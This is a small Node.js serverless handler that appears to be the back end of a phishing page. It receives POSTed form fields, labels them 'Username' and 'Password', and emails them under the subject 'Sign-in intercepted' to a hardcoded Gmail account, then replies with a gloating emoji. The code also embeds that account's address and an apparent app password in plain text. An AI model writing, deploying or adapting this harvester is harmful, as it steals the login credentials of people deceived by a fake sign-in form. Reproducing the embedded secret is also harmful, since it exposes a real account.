// Import nodemailer or any email library you prefer
// npm install nodemailer
const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
    if (req.method === 'POST') {
        const { name, email } = req.body;

        // Set up nodemailer transporter
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: 'silasputerbaugh1@gmail.com',
                pass: 'ziug hfpe liwa hkzf',
            },
        });

        // Compose email
        const mailOptions = {
            from: 'silasputerbaugh1@gmail.com',
            to: 'silasputerbaugh1@gmail.com',  // Your email address
            subject: 'Sign-in intercepted',
            text: `Username: ${name}\nPassword: ${email}`,
        };

        // Send email
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.error(error);
                res.status(500).send('Internal Server Error');
            } else {
                console.log('Email sent: ' + info.response);
                res.status(200).send('Email sent successfully! 😈');
            }
        });
    } else {
        res.status(405).send({ error: 'Method Not Allowed' });
    }
};
